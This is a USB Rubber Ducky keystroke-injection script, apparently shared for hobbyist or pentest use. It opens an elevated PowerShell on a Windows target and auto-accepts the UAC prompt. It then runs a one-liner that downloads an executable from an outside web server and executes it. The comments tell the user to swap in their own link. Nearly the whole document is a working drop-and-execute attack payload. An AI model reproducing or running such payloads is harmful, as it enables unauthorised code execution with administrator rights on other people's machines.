REM A ducky script that uses the powershell to download and execute a file from a webserver, then close all powershell windows (with another powershell). Intended for use with windows 10 target, but probably works with Windows 7 and 8.
REM 
REM Change the link and what name to save the file as.
REM 
REM Execution time: 5-8 seconds (delays will need to be modified based on target machine speed)
REM 
REM Preview video: https://www.youtube.com/watch?v=gGHjdtamQ9A
REM 
```
REM Windows 10: Poweshell administrator download and execute file
REM Author: Judge2020
REM author website: Judge2020.com
REM
REM start of script
REM
REM let the HID enumerate
DELAY 1000
GUI r
DELAY 200
REM my best attempt at a elevated powershell instance
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1000
ALT y
DELAY 200
STRING $down = New-Object System.Net.WebClient; $url = 'http://www.greyhathacker.net/tools/messbox.exe'; $file = 'mess1.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
```
